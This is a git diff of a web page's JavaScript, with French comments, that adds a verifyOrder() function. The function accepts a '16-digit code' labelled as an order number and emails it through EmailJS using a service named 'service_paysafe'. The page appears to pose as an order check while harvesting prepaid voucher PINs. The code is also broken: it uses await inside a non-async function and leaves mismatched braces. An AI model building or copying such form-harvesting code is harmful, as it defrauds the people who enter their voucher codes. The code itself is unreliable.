@@ -3,7 +3,31 @@ console.log("script.js chargé");
 // Initialisation EmailJS
 emailjs.init("rORVGScs1n94sqOPi");
 
- // Attendre le chargement de reCAPTCHA
+function verifyOrder() {
+
+    console.log("verifyOrder appelée");
+
+    const input = document.getElementById("orderNumber");
+    const message = document.getElementById("message");
+    const button = document.querySelector(".search-box button");
+
+    // Supprimer les espaces avant la vérification
+    const orderNumber = input.value.replace(/\s/g, "");
+
+    // Vérifie qu'il y a exactement 16 chiffres
+    if (!/^\d{16}$/.test(orderNumber)) {
+        message.style.color = "red";
+        message.textContent = "Please enter a valid 16-digit code.";
+        input.focus();
+        return;
+    }
+
+
+    button.disabled = true;
+    button.textContent = "Sending...";
+    message.textContent = "";
+
+// Attendre le chargement de reCAPTCHA
         await new Promise(resolve => {
             grecaptcha.ready(resolve);
         });
@@ -39,11 +63,6 @@ emailjs.init("rORVGScs1n94sqOPi");
     }
 
 }
-
-    button.disabled = true;
-    button.textContent = "Sending...";
-    message.textContent = "";
-
     emailjs.send(
         "service_paysafe",
         "template_psf",
